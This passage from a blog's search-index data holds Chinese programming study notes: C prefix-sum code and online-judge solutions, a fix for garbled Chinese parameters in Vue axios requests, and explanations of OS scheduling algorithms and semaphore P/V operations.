&#x3D;a[1]+a[2]+a[3]+a[l-1]+a[l]+a[l+1]……a[r];sum[l-1]&#x3D;a[1]+a[2]+a[3]+a[l-1];sum[r]-sum[l-1]&#x3D;a[l]+a[l+1]+……+a[r];\n\n二维前缀和\n知道了两个点的位置和他们的二维前缀和图中红色是左上角的那个点的二维前缀和红色+黄色部分是右下角的那个点的二维前缀和是不是可以用这个来求出他们之间的矩阵的和呢？也就是这一部分：\n\nD - B - C + A\n\n\n#include&lt;iostream&gt;\n#include&lt;cstdio&gt;\n#define int long long\nusing namespace std;\nconst int Max &#x3D; 1003;\nint a[Max][Max];\nint f[Max][Max];\nsigned main()\n&#123;\n\tfreopen(&quot;acioi.in&quot;,&quot;r&quot;,stdin);\n\tint n,m,c;\n\tcin &gt;&gt; n &gt;&gt; m &gt;&gt; c;\n\tfor(register int i &#x3D; 1;i &lt;&#x3D; n;++ i)\n\t\tfor(register int j &#x3D; 1;j &lt;&#x3D; m;++ j)\n\t\t\tcin &gt;&gt; a[i][j],f[i][j] &#x3D; f[i - 1][j] + f[i][j - 1] - f[i - 1][j - 1] + a[i][j];\n\tint k;\n\tcin &gt;&gt; k;\n\tfor(register int i &#x3D; 1;i &lt;&#x3D; k;++ i)\n\t&#123;\n\t\tint x1,x2,y1,y2;&#x2F;&#x2F;x1,y1是左上角的坐标，另一对是右下角的坐标 \n\t\tcin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2;\n\t\tcout &lt;&lt; f[x2][y2] - f[x1 - 1][y2] - f[x2][y1 - 1] + f[x1 - 1][y1 - 1]; \n\t&#125;\n\tcout &lt;&lt; M &lt;&lt; endl; \n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n2021计设2021年程序设计实践练习11123：\n\n\nduoxida的数字游戏\n\n\n\n\n\n[ Submit Code ] [ Top 20 Runs ] [ Runs Status ]\n\n\n\n\nAcceteped : 892\n\nSubmit : 2072\n\n\nTime Limit : 1000 MS\n\nMemory Limit : 65536 KB\n\n\n\n\n\n\n\nDescription\n\n\n\n\n题目描述duoxida很喜欢玩数字游戏，某天无聊的时候，他决定一个人玩数字游戏。他黑板上写下了一行总共有n个数，然后对其重复进行一个操作: 找到从左到右第k个的数x，在数字序列的最右边增加一个x，删除最左边的第一个数字。 duoxida很想知道知道多少次操作后，这个序列就变得完全一样。输入数据的第一行为一个整数t,1&lt;&#x3D;t&lt;&#x3D;10，表示测试用例的个数。每组样例的第一行是n，k,(1≤k≤n≤1000)。 接下来一行有n个整数。输出每个用例输出一行，即操作次数，如果这个序列无法变得完全一样，输出”-1”。样例输入2  3 2  3 1 1  3 1  3 1 1 样例输出1  -1\n\n\n\n\n#include&lt;stdio.h>\nint main()\n&#123;\n    int t;\n    scanf(\"%d\", &amp;t);\n    while (t--)\n    &#123;\n        int n, k;\n        scanf(\"%d %d\", &amp;n, &amp;k);\n        int x[1001];\n        for (int i = 0; i &lt; n; i++)\n        &#123;\n            scanf(\"%d\", &amp;x[i]);\n        &#125;\n        int flag = 1;\n        int a = x[k - 1];\n        for (int i = k; i &lt; n; i++)\n        &#123;\n            if (a != x[i])\n            &#123;\n                flag = 0;\n                break;\n            &#125;\n        &#125;\n        if (flag == 0)\n            printf(\"-1\\n\");\n        else\n        &#123;\n            int sum = 0;\n            for (int i = k - 2; i > 0; i--)\n            &#123;\n                if (x[i] == a)\n                &#123;\n                    sum++;\n                &#125;\n                else\n                    break;\n            &#125;\n            printf(\"%d\\n\", k - 1 - sum);\n        &#125;\n    &#125;\n    return 0;\n&#125;\n\n\n1127：\n\n\n数列\n\n\n\n[ Submit Code ] [ Top 20 Runs ] [ Runs Status ]\n\n\nAcceteped : 567\n\n\nTime Limit : 3000 MS\n\n\n\n\n\nDescription\n\n\n题目描述数列生成规则如下：第一项的值为a,第二项的值为b, (0 ≤ a,b ≤ 9)前两项之积，如果为一位数，则为本项的值；如果为两位数，则十位为本项，个位为后一项。比如a&#x3D;2,b&#x3D;3,那么数列为2,3,6,1,8,8,…。 请写一个程序，输出数列的第n个元素的值。输入第一行是一个整数K，表示样例的个数。 每个样例的第一行是三个整数a,b,Q(1 ≤ Q ≤ 1,000),其中Q表示查询的次数。 以后的Q行，每行一个整数n,(1 ≤ n ≤ 1,000,000,000)。输出每个样例的每个查询输出一行，即对应元素的值。样例输入3 2 3 4 1 2 3 4 3 3 4 1 2 3 4 9 9 1 100000000 样例输出2 3 6 1 3 3 9 2 2 \n\n\n\n\n\n\n\n\n\n\n\n#include &lt;stdio.h>\n#include &lt;stdlib.h>\nvoid shulie(int b, int c, int m)\n&#123;\n    int x[1001]=&#123;0&#125;;\n    x[0]=b;x[1]=c;\n    int i,o,n,p;\n       for(i=2;i&lt;108;i++)\n       &#123;\n           n=x[i-1]*x[i-2];\n                if(n&lt;10)\n               x[i]=n;\n           else\n           &#123;\n            x[i]=n/10;\n           x[i+1]=n%10;\n           i++;\n           &#125;\n       &#125;\n       for(i=0;i&lt;m;i++)\n       &#123;\n           scanf(\"%d\",&amp;o);\n           if(o&lt;108)\n            printf(\"%d\\n\",x[o-1]);\n           else&#123;\n            p=(o-108)%8+100;\n                printf(\"%d\\n\",x[p-1]);\n       &#125;\n       &#125;\n&#125;\nint main()\n&#123;\n    int k, a, b, q, n, i;\n    scanf(\"%d\", &amp;k);\n    while (k--)\n    &#123;\n        scanf(\"%d%d%d\", &amp;a, &amp;b, &amp;q);\n            shulie(a, b, q);\n    &#125;\n    return 0;\n&#125;\n\n\n\n1163：\n\n\nASCII\n\n\n\n\n\n[ Submit Code ] [ Top 20 Runs ] [ Runs Status ]\n\n\n\n\nAcceteped : 1654\n\nSubmit : 5058\n\n\nTime Limit : 1000 MS\n\nMemory Limit : 65536 KB\n\n\n\n\n\n\n\nDescription\n\n\n\n\n题目描述给你一段ASCII编码的文字，输出其每个字符的ASCII码。输入一段文字，由ASCII码字符组成。输出先输出行号，行号为16进制，占5位，从0开始计数，行号前导为0，然后空一格。 每行最多输出32个字符的ASCII码，每个ASCII码为16进制，占2位，前导为0，中间用空格隔开。 所有16进制使用大写AF表示1015。最后一行行末无空格，无换行。样例输入ACM International Collegiate Programming Contest, I LOVE YOU Lotus is a mystic symbol.  样例输出00000 41 43 4D 20 49 6E 74 65 72 6E 61 74 69 6F 6E 61 00001 6C 20 43 6F 6C 6C 65 67 69 61 74 65 20 50 72 6F 00002 67 72 61 6D 6D 69 6E 67 20 43 6F 6E 74 65 73 74 00003 2C 0A 49 20 4C 4F 56 45 20 59 4F 55 0A 4C 6F 74 00004 75 73 20 69 73 20 61 20 6D 79 73 74 69 63 20 73 00005 79 6D 62 6F 6C 2E 20 0A \n\n\n\n\n\n\n\n\n\n#include&lt;stdio.h>\nint main()\n&#123;\n    char s[100000];\n    char c;\n    int a = 0;\n    while((c=getchar()) != EOF) &#123;\n        s[a++] = c;\n    &#125;\n    int lineCnt;\n    int line = 0;\n    if(a % 16 == 0) &#123;\n        lineCnt = a / 16;\n    &#125; else &#123;\n        lineCnt = a / 16 + 1;\n    &#125;\n    for(int i = 0; i &lt; lineCnt - 1; i++) &#123;\n        printf(\"%05X \", line++);\n        for(int j = 0; j &lt; 15; j++) &#123;\n            printf(\"%02X \", s[i*16+j]);\n        &#125;\n        printf(\"%02X\", s[i*16+15]);\n        printf(\"\\n\");\n    &#125;\n    printf(\"%05X \", line++);\n    for(int j = 0; j &lt; a%16 - 1; j++) &#123;\n        printf(\"%02X \", s[(lineCnt-1)*16+j]);\n    &#125;\n    printf(\"%02X\", s[(lineCnt-1)*16+a%16-1]);\n    return 0;\n &#125;\n\n\n\n1170：\n\n\nICPC\n\n\n\n\n\n[ Submit Code ] [ Top 20 Runs ] [ Runs Status ]\n\n\n\n\nAcceteped : 1009\n\nSubmit : 2432\n\n\nTime Limit : 1000 MS\n\nMemory Limit : 65536 KB\n\n\n\n\n\n\n\nDescription\n\n\n\n\n题目描述ACM&#x2F;ICPC比赛涉及的知识点非常多，一个队伍三个人需要能够互补。一个队伍某个知识点的高度是三个人中水平最高的那个人决定。现在给你三个人的每个知识点的水平情况，请计算一下这个队伍的水平。输入存在多个样例。每个样例的第一行是一个整数N(3≤N≤100)，表示所有知识点的个数。 以后三行为每个人每个知识点的水平情况。水平用A到E表示，一共5级，A最强，E最弱，依次递减。输出每个样例输出两行，第一行为一个字符串，一个队伍的各个知识点的水平情况。第二行是5个整数，表示5个级别知识点的个数,每个整数之间有一个空格。样例输入3 ABC BBB AAE 4 DDBD DEDC CDDE 0 样例输出AAB 2 1 0 0 0 CDBC 0 1 2 1 0 \n\n\n\n\n#include&lt;stdio.h>\nint main()\n&#123;\n    int n;\n    while(scanf(\"%d\",&amp;n))\n    &#123;\n        if(n==0)\n        &#123;\n            return 0;\n        &#125;\n        getchar();\n        char x[3][100];\n        int i,j;\n        for(i=0;i&lt;3;i++)\n        &#123;\n            for(j=0;j&lt;n;j++)\n            &#123;\n                scanf(\"%c\",&amp;x[i][j]);\n            &#125;\n            getchar();\n            \n        &#125;\n    char max[100];\n    int t=0;\n    for(j=0;j&lt;n;j++)&#123;    \n    char max1=x[0][j];\n        for(i=0;i&lt;3;i++)\n        &#123;\n            \n            if(max1>x[i][j])\n            &#123;\n                max1=x[i][j];\n            &#125;    \n        &#125;\n        max[t]=max1;\n        t++;\n    &#125;\n    int a=0,b=0,c=0,d=0,e=0;\n    for(i=0;i&lt;t;i++)\n    &#123;\n        printf(\"%c\",max[i]);\n        \n        if(max[i]=='A')\n        &#123;\n            a++;\n        &#125;\n        else if(max[i]=='B')\n        &#123;\n            b++;\n        &#125;\n        else if(max[i]=='C')\n        &#123;\n            c++;\n        &#125;\n        else if(max[i]=='D')\n        &#123;\n            d++;\n        &#125;\n        else\n        &#123;\n            e++;\n        &#125;\n    &#125;\n    printf(\"\\n\");\n    printf(\"%d %d %d %d %d\\n\",a,b,c,d,e);\n    &#125;\n \n    return 0;\n &#125; \n\n\n\n1241:\n\n\nPermutation\n\n\n\n\n\n[ Submit Code ] [ Top 20 Runs ] [ Runs Status ]\n\n\n\n\nAcceteped : 1179\n\nSubmit : 2750\n\n\nTime Limit : 1000 MS\n\nMemory Limit : 65536 KB\n\n\n\n\n\n\n\nDescription\n\n\n\n\n\n\n\n\n\n\n\n\n输入第一行是一个整数K(1≤K≤1000)，表示样例的个数。 每个样例占一行，第一个整数是n(1≤n≤100)，以后的n个整数xi,1≤xi≤n且 xi是唯一的, (1x12x2⋯⋯nxn)表示一个置换。输出输出一个样例的结果。样例输入3 3 1 2 3 3 2 1 3 3 2 3 1 样例输出1 2 3 \n\n\n\n\n\n\n#include&lt;stdio.h>\nint gcd(int a,int b) &#123;\n    if(b==0) return a;\n    return gcd(b,a%b);\n&#125;\nint main()\n&#123;\n    int k;\n    scanf(\"%d\",&amp;k);\n    while(k--)&#123;\n        int n;\n        scanf(\"%d\",&amp;n);\n        int num[120];\n        for(int i = 1 ;i &lt;= n;i++)\n        &#123;\n            scanf(\"%d\",&amp;num[i]);\n        &#125;\n            \n        long long int res = 1;\n        for(int i = 1 ;i &lt;= n;i++)&#123;\n            long long int tmp = 1;\n            int pos = num[i];\n            while(pos!=i)&#123;\n                tmp++;\n                pos = num[pos];\n            &#125;\n            res = res * tmp /gcd(res,tmp);\n        &#125;\n        printf(\"%d\\n\",res);\n    &#125;\n    return 0;\n&#125;\n\n1251:\n\n\nColombian Number\n\n\n\n\n\n[ Submit Code ] [ Top 20 Runs ] [ Runs Status ]\n\n\n\n\nAcceteped : 2630\n\nSubmit : 6299\n\n\nTime Limit : 1000 MS\n\nMemory Limit : 65536 KB\n\n\n\n\n\n\n\nDescription\n\n\n\n\nColombian Number题目描述对于正整数n,不存在整数k,使得n等于k加上k的数码累加和，我们称这样的数是哥伦比亚数或者自我数。 比如 11就不是一个哥伦比亚数，因为10加上10的数码累加和1等于11;而20则是一个哥伦比亚数。输入第一行是一个整数K(K≤10,000)，表示样例的个数。 以后每行一个正整数n(1≤n≤1,000,000,000)输出每行输出一个样例的结果，如果是哥伦比亚数输出”Yes”,否则输出”No”。样例输入5 1 2 3 20 21 样例输出Yes No Yes Yes No\n\n\n\n\n\n#include&lt;stdio.h>\nint Colnum(int i)\n&#123;\n    int m = i;\n    while(i != 0)\n    &#123;\n        m += i%10;\n        i /= 10;\n    &#125;\n    return m;\n&#125;\nint main()\n&#123;\n    int t;\n    scanf(\"%d\",&amp;t);\n    while(t--)\n    &#123;\n        int n,i;\n        int flag = 1;\n        scanf(\"%d\",&amp;n);\n        for(i = n-1; i > 0 &amp;&amp; i > n-81; i--)\n        &#123;\n            if(Colnum(i) == n)\n            &#123;\n                flag = 0;\n                break;\n            &#125;\n        &#125;\n        if(flag==1)\n        &#123;\n            printf(\"Yes\\n\");\n        &#125;\n            \n        else\n        &#123;\n            printf(\"No\\n\");\n        &#125;\n            \n    &#125;\n    return 0;\n&#125;\n\n","slug":"C语言知识点","date":"2021-01-05T06:52:00.000Z","categories_index":"学习笔记","tags_index":"C语言","author_index":"kif"},{"id":"77ab0fbeb021db0c986d25c4c83eb7f1","title":"vue axios传中文参数导致乱码的解决方案","content":"问题描述var that &#x3D; this;\n         var name &#x3D; that.signform.signname;\n         var username &#x3D; that.signform.signusername;\n         var password &#x3D; that.signform.signpassword;\n         var user_type &#x3D; that.sign_user_type;\n         var email &#x3D; that.signform.mailAddress;\n         var studentid &#x3D; that.signform.studentid;\n         this.$axios(&#123;\n           method: &quot;post&quot;,\n           url:\n             this.$api +\n             &#96;&#x2F;Register&#x2F;?name&#x3D;$&#123;name&#125;&amp;username&#x3D;$&#123;username&#125;&amp;password&#x3D;$&#123;password&#125;&amp;user_type&#x3D;$&#123;user_type&#125;&amp;email&#x3D;$&#123;email&#125;&amp;studentid&#x3D;$&#123;studentid&#125;&#96;, &#x2F;&#x2F;利用了字符串模板来携带id\n         &#125;)\n           .then((res) &#x3D;&gt; &#123;\n             console.log(res);\n             this.changeCode();\n           &#125;)\n           .catch((req) &#x3D;&gt; &#123;\n             &#x2F;&#x2F; console.log(req);\n           &#125;);\n\n在vue axios post 请求注册用户时，刚开始通过如上字符拼接形式调用api时，在服务器后端出现了utf-8汉语乱码：\n\n图中name字段本是中文，服务器后端出现了utf-8汉语乱码，\n查询bing后有如下几种解决办法：\n\n其中有添加\n\nheaders: {\n​            “Content-Type”: “application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8”\n​                                    },\n\n但个人实验了一下没有解决问题，\n之后又试了下js函数把字符转换，没有解决问题。\n方法：使用vue axios推荐的vue-axios的使用及其get与post网络请求\n即：\nget请求时用如下方式代替字符拼接方式\n\n&#x2F;&#x2F; Optionally the request above could also be done as\naxios.get(&#39;&#x2F;user&#39;, &#123;\n    params: &#123;\n      ID: 12345\n    &#125;\n  &#125;)\n  .then(function (response) &#123;\n    console.log(response);\n  &#125;)\n  .catch(function (error) &#123;\n    console.log(error);\n  &#125;);\n\npost请求时一样：\naxios.post(&#39;&#x2F;user&#39;, &#123;\n    firstName: &#39;Fred&#39;,\n    lastName: &#39;Flintstone&#39;\n  &#125;)\n  .then(function (response) &#123;\n    console.log(response);\n  &#125;)\n  .catch(function (error) &#123;\n    console.log(error);\n  &#125;);\n\n\n\n所以项目中最终采取的代码：\n\nlet data &#x3D; new FormData();\ndata.append(&quot;name&quot;, this.signform.signname);\ndata.append(&quot;username&quot;, this.signform.signusername);\ndata.append(&quot;password&quot;, this.signform.signpassword);\ndata.append(&quot;user_type&quot;, this.sign_user_type);\ndata.append(&quot;email&quot;, this.signform.mailAddress);\ndata.append(&quot;studentid&quot;, this.signform.studentid);\nconsole.log(data);\nvar that &#x3D; this;\naxios\n  .post(this.$api + &quot;&#x2F;Register&#x2F;&quot;, data) &#x2F;&#x2F;以slash结尾\n  .then(function (response) &#123;\n    console.log(response.data);\n  &#125;)\n  .catch((err) &#x3D;&gt; &#123;&#125;);\n\n\n注意的时此时后台时没有显示字段的，但是数据库里已经加入了（注册功能哈）。\n","slug":"vue-axios传中文参数导致乱码的解决方案","date":"2020-12-25T09:59:00.000Z","categories_index":"","tags_index":"Vue,Axios","author_index":"kif"},{"id":"6636482fc925ef3fdf260b6b326d9fbf","title":"操作系统之调度","content":"调度调度的基本概念调度研究的问题：当有一堆任务要处理，但由于资源有限，这些事情没法同时处理。这就需要确定某种规则来决定处理这些任务的顺序，这就是调度研究的问题。\n举个有味道的例子：现在有4个人要上厕所(他们几乎同时到达)，他们分别需要使用厕所3分钟、10分钟、1分钟、4分钟。但是他们面前只有一个厕所，而且厕所里面只有一个马桶，那我们应该怎么确定他们上厕所的顺序呢？*我们有以下的方案：**1. 谁先来，谁就先用厕所。\\2. 谁需要使用的时间少，谁先用厕所。***我们先说说第一种方案，这种方案很公平，谁先来谁先用，但是这样会产生一个问题。假如他们来的顺序是10分钟、4分钟、3分钟、1分钟，显然，采用这种方案的话，对于最后一个人，他上厕所1分钟要等17分钟，估计翔都憋不住了吧…我们再说下第二种方案，采用这种方案的话，虽然没有第一种方案公平，但是这4个人的整体平均等待时间是最少的。(平均等待时间 &#x3D; 每个人等待的时间的和 &#x2F; 人数)****\n在上面的例子中，厕所就是资源，方案就是调度的规则，而调度就是安排他们上厕所。\n我们回到操作系统，在多道程序系统中，进程的数量往往是多于处理机个数的，这样就导致处理机不能并行的处理所有进程。处理机调度，就是从就绪队列中按照某种的算法选择一个进程并将处理机分配给它，以实现进程的并发运行。\n操作系统的调度有三个层次，分别是高级调度、中级调度和低级调度。下面分别介绍它们。\n高级调度 (外存 –&gt; 内存)我们知道是计算机的内存空间是有限，所以有时操作系统无法将用户提交的作业全部放入内存 (在单道批系统时)，因此操作系统就需要确定某种算法，决定作业调度内存的顺序。高级调度，就是按某种算法在外存中处于后备队列的作业中挑选一个(或多个)作业，给它分配内存等必要资源，并建立相应的进程(建立PCB)，以使它(们)获得竞争处理机的权利。高级调度是外存与内存之间的调度。在这里，每个作业只调入一次，调出一次。作业调入时会建立相应的PCB，作业调出时才撤销PCB。高级调度主要是指调入的问题，因为只有调入的时机需要操作系统来确定，而调出的时机必然是作业运行结束后。这种调度就好像刚刚的上厕所问题，厕所外的人处于后备队列，而高级调度的任务就类似把人从厕所外调入到厕所内。\n\n中级调度 (外存 –&gt; 内存)背景：在引入了虚拟存储技术之后，操作系统可将暂时不能运行的进程调至外存等待。等它重新具备了运行条件且内存稍有空闲时，操作系统再把它调回内存。回顾一下，我们之前说过进程有几种状态，如 就绪态、阻塞态、运行态…，那被调到外存等待的进程处于什么状态呢？这些进程会处于挂起态。值得注意的，该进程的数据段和代码段会被调回外存，但PCB依旧会留在内存中的，并不会被调回外存，因为操作系统只有通过该进程的PCB，才能对其进行管理。被挂起进程的PCB会被操作系统放到挂起队列中。\n中级调度，就是决定将哪个挂起状态的进程从外存重新调回内存。注意和高级调度区分，虽然同样是从外存调到内存，但高级调度是调入，中级调度是调回。由于一个进程可能会被多次调出、调回内存，因此中级调度发生的频率要比高级调度的高。\n\n补充：进程的挂起态与七状态模型暂时调到外存等待的进程状态为挂起态。挂起态其实又可以进一步细分为就绪挂起、阻塞挂起两种状态，于是，五状态模型现在变成了七状态模型。 \n注意：\n\n注意”挂起态”和”阻塞态”的区别，两种状态都是暂时不能获得CPU的服务，但挂起态是将进程实体(除PCB外)调到外存，而阻塞态的进程实体还留存在内存中。\n有的操作系统不只把挂起态分为阻塞挂起和就绪挂起，甚至会根据阻塞原因的不同把阻塞挂起态的进程进一步细分为多个队列。\n\n低级调度 (内存 –&gt; CPU)低级调度的主要任务是按照某种规则从就绪队列中选取一个进程，将CPU分配给它。低级调度是操作系统中最基本的一种调度，在一般的操作系统中都必须配置低级调度。而且低级调度的频率很高，一般几十毫秒一次。\n\n又是一个有味道的例子故事背景：现在有很多个人想上厕所，他们面前有一间厕所，厕所里面有三个马桶。\n接下来，我们把厕所看作是内存，马桶看作是CPU，现在我们来看看这三种调度与这例子的类比。\n\n高级调度：研究怎么让还没进入过厕所的人进入厕所。(厕所外 –&gt; 厕所内，之前一直在厕所外)\n中级调度：有的人进入了厕所，但是尿不出来，于是他们被赶了出去。中级调度就是研究怎么让这些被赶出去的人再次回到厕所。 (厕所外 –&gt; 厕所内，之前进入过厕所)\n低级调度：研究怎么给厕所内的人分配马桶。(厕所内 –&gt; 马桶上)\n\n总结\n调度的算法先来先服务调度算法（FCFS）最简单的一个调度算法，就是非抢占式的先来先服务（*First Come First Severd, FCFS*）算法了。\n\n顾名思义，先来后到，每次从就绪队列选择最先进入队列的进程，然后一直运行，直到进程退出或被阻塞，才会继续从队列中选择第一个进程接着运行。\n这似乎很公平，但是当一个长作业先运行了，那么后面的短作业等待的时间就会很长，不利于短作业。\nFCFS 对长作业有利，适用于 CPU 繁忙型作业的系统，而不适用于 I&#x2F;O 繁忙型作业的系统。\n最短作业优先调度算法（SJF）最短作业优先（*Shortest Job First, SJF*）调度算法同样也是顾名思义，它会优先选择运行时间最短的进程来运行，这有助于提高系统的吞吐量。\n\n这显然对长作业不利，很容易造成一种极端现象。\n比如，一个长作业在就绪队列等待运行，而这个就绪队列有非常多的短作业，那么就会使得长作业不断的往后推，周转时间变长，致使长作业长期不会被运行。\n高响应比优先调度算法（HRRN）前面的「先来先服务调度算法」和「最短作业优先调度算法」都没有很好的权衡短作业和长作业。\n那么，高响应比优先 （*Highest Response Ratio Next, HRRN*）调度算法主要是权衡了短作业和长作业。\n每次进行进程调度时，先计算「响应比优先级」，然后把「响应比优先级」最高的进程投入运行，「响应比优先级」的计算公式：\n\n时间片轮转调度算法（RR）最古老、最简单、最公平且使用最广的算法就是时间片轮转（*Round Robin, RR*）调度算法。\n\n每个进程被分配一个时间段，称为时间片（*Quantum*），即允许该进程在该时间段中运行。\n\n如果时间片用完，进程还在运行，那么将会把此进程从 CPU 释放出来，并把 CPU 分配另外一个进程；\n如果该进程在时间片结束前阻塞或结束，则 CPU 立即进行切换；\n\n另外，时间片的长度就是一个很关键的点：\n\n如果时间片设得太短会导致过多的进程上下文切换，降低了 CPU 效率；\n如果设得太长又可能引起对短作业进程的响应时间变长。将\n\n通常时间片设为 20ms~50ms 通常是一个比较合理的折中值。\n多级反馈队列调度算法多级反馈队列（*Multilevel Feedback Queue*）调度算法是「时间片轮转算法」和「最高优先级算法」的综合和发展。\n顾名思义：\n\n「多级」表示有多个队列，每个队列优先级从高到低，同时优先级越高时间片越短。\n「反馈」表示如果有新的进程加入优先级高的队列时，立刻停止当前正在运行的进程，转而去运行优先级高的队列；\n\n\n来看看，它是如何工作的：\n\n设置了多个队列，赋予每个队列不同的优先级，每个队列优先级从高到低，同时优先级越高时间片越短；\n新的进程会被放入到第一级队列的末尾，按先来先服务的原则排队等待被调度，如果在第一级队列规定的时间片没运行完成，则将其转入到第二级队列的末尾，以此类推，直至完成；\n当较高优先级的队列为空，才调度较低优先级的队列中的进程运行。如果进程运行时，有新进程进入较高优先级的队列，则停止当前运行的进程并将其移入到原队列末尾，接着让较高优先级的进程运行；\n\n可以发现，对于短作业可能可以在第一级队列很快被处理完。对于长作业，如果在第一级队列处理不完，可以移入下次队列等待被执行，虽然等待的时间变长了，但是运行时间也会更长了，所以该算法很好的兼顾了长短作业，同时有较好的响应时间。\n几种调度算法的比较：\n\n参考文章：\nCPU调度算法总结\n大厂面试爱问的「调度算法」，20 张图一举拿下\n","slug":"操作系统之调度","date":"2020-12-09T13:40:00.000Z","categories_index":"学习笔记","tags_index":"操作系统","author_index":"kif"},{"id":"510210968f59787c491612129c395946","title":"操作系统之信号量、P、V操作","content":"信号量是最早出现的用来解决进程同步与互斥问题的机制(也可实现进程通信)，包括一个称为信 号量的变量及对它进行的两个原语操作。信号量为一个整数，我们设这个信号量为：sem。很显然，我们规定在sem大于等于零的时候代表可供并发进程使用的 资源实体数，sem小于零的时候，表示正在等待使用临界区的进程的个数。根据这个原则，在给信号量附初值的时候，我们显然就要设初值大于零。\np操作和v操作是不可中断的程序段，称为原语。P,V原语中P是荷兰语的Passeren，相当于英文的pass, V是荷兰语的Verhoog,相当于英文中的incremnet。\n且在P,V愿语执行期间不允许有中断的发生。\n对于具体的实现，方法非常多，可以用硬件实现，也可以用软件实现。这种信号量机制必须有公共内存，不能用于分布式操作系统，这是它最大的弱点。\n首先应弄清PV操作的含义：PV操作由P操作原语和V操作原语组成（原语是不可中断的过程），对信号量进行操作，具体定义如下：\n​       P（S）：①将信号量S的值减1，即S&#x3D;S-1；\n​          ②如果S&gt;&#x3D;0，则该进程继续执行；否则该进程置为等待状态，排入等待队列。\n​       V（S）：①将信号量S的值加1，即S&#x3D;S+1；\n​          ②如果S&gt;0，则该进程继续执行；否则释放队列中第一个等待信号量的进程。\nPV操作的意义：我们用信号量及PV操作来实现进程的同步和互斥。PV操作属于进程的低级通信。\n什么是信号量？信号量（semaphore）的数据结构为一个值和一个指针，指针指向等待该 信号量的下一个进程。信号量的值与相应资源的使用情况有关。当它的值大于0时，表示当前可用资源的数量；当它的值小于0时，其绝对值表示等待使用该资源的 进程个数。注意，信号量的值仅能由PV操作来改变。\n一般来说，信号量S&gt;&#x3D;0时，S表示可用资源的数量。执行一次P操作意味着请求分配一个单位资源，因此S的值减1；\n当S&lt;0时，表示已经没有可用资源，请求者必须等待别的进程释放该类资源，它才能运行下去。而执行一个V操作意味着释放一个单位资源，因此S的值加1；\n若S&lt;&#x3D;0，表示有某些进程正在等待该资源，因此要唤醒一个等待状态的进程，使之运行下去\n利用信号量和PV操作实现进程互斥的一般模型是：进程P1          进程P2        ……        进程Pn\n……           ……         ……\nP（S）；         P（S）；                 P（S）；\n临界区；         临界区；                 临界区；\nV（S）；         V（S）；                 V（S）；\n……           ……         ……        ……\n其中信号量S用于互斥，初值为1\n使用PV操作实现进程互斥时应该注意的是：\n（1）每个程序中用户实现互斥的P、V操作必须成对出现，先做P操作，进临界区，后做V操作，出临界区。若有多个分支，要认真检查其成对性。\n（2）P、V操作应分别紧靠临界区的头尾部，临界区的代码应尽可能短，不能有死循环。\n（3）互斥信号量的初值一般为1。\n利用信号量和PV操作实现进程同步PV操作是典型的同步机制之一。用一个信号量与一个消息联系起来，当信号量的值为0时，表示期望的消息尚未产生；当信号量的值非0时，表示期望的消息已经存在。用PV操作实现进程同步时，调用P操作测试消息是否到达，调用V操作发送消息。\n利用信号量和PV操作实现进程互斥的一般模型是：\n进程A              进程B\n ….                        ….\nL: P(信号量)           L2:V(信号量）\n ….                           ….\n使用PV操作实现进程同步时应该注意的是：\n（1）分析进程间的制约关系，确定信号量种类。在保持进程间有正确的同步关系情况下，哪个进程先执行，哪些进程后执行，彼此间通过什么资源（信号量）进行协调，从而明确要设置哪些信号量。\n（2）信号量的初值与相应资源的数量有关，也与P、V操作在程序代码中出现的位置有关。\n（3）同一信号量的P、V操作要成对出现，但它们分别在不同的进程代码中。\n【例1】生产者-消费者问题\n在多道程序环境下，进程同步是一个十分重要又令人感兴趣的问题，而生产者-消费者问题是其中一个有代表性的进程同步问题。下面我们给出了各种情况下的生产者-消费者问题，深入地分析和透彻地理解这个例子，对于全面解决操作系统内的同步、互斥问题将有很大帮助。\n（1）一个生产者，一个消费者，公用一个缓冲区。\n定义两个同步信号量：\nempty——表示缓冲区是否为空，初值为1。\nfull——表示缓冲区中是否为满，初值为0。\n\n生产者进程\nwhile(TRUE)&#123;\n\n       生产一个产品;\n\n       P(empty);\n\n       产品送往Buffer;\n\n       V(full);\n\n       &#125;\n\n\n消费者进程\nwhile(TRUE)&#123;\n\n       P(full);\n\n      从Buffer取出一个产品;\n\n       V(empty);\n\n       消费该产品;\n\n       &#125;\n\n（2）一个生产者，一个消费者，公用n个环形缓冲区。\n定义两个同步信号量：\nempty——表示缓冲区是否为空，初值为n。\nfull——表示缓冲区中是否为满，初值为0。\n​       设缓冲区的编号为1～n&amp;61485;1，定义两个指针in和out，分别是生产者进程和消费者进程使用的指针，指向下一个可用的缓冲区。\n生产者进程\nwhile(TRUE)&#123;\n\n       生产一个产品;\n\n       P(empty);\n\n        产品送往buffer(in);\n\n        in&#x3D;(in+1)mod n;\n\n        V(full);\n\n        &#125;\n\n消费者进程\nwhile(TRUE)&#123;\n\nP(full);\n\n  从buffer(out)中取出产品;\n\n  out&#x3D;(out+1)mod n;\n\n  V(empty);\n\n  消费该产品;\n\n  &#125;\n\n（3）一组生产者，一组消费者，公用n个环形缓冲区\n​       在这个问题中，不仅生产者与消费者之间要同步，而且各个生产者之间、各个消费者之间还必须互斥地访问缓冲区。\n定义四个信号量：\nempty——表示缓冲区是否为空，初值为n。\nfull——表示缓冲区中是否为满，初值为0。\nmutex1——生产者之间的互斥信号量，初值为1。\nmutex2——消费者之间的互斥信号量，初值为1。\n​       设缓冲区的编号为1～n&amp;61485;1，定义两个指针in和out，分别是生产者进程和消费者进程使用的指针，指向下一个可用的缓冲区。\n生产者进程\nwhile(TRUE)&#123;\n\n        生产一个产品;\n\n        P(empty);\n\n        P(mutex1);\n\n        产品送往buffer(in);\n\n        in&#x3D;(in+1)mod n;\n\n        V(mutex1);\n\n        V(full);\n\n        &#125;\n\n消费者进程\nwhile(TRUE)&#123;\n\nP(full);\n\n  P(mutex2);\n\n  从buffer(out)中取出产品;\n\n  out&#x3D;(out+1)mod n;\n\n  V(mutex2);\n\n  V(empty);\n\n  消费该产品;\n\n  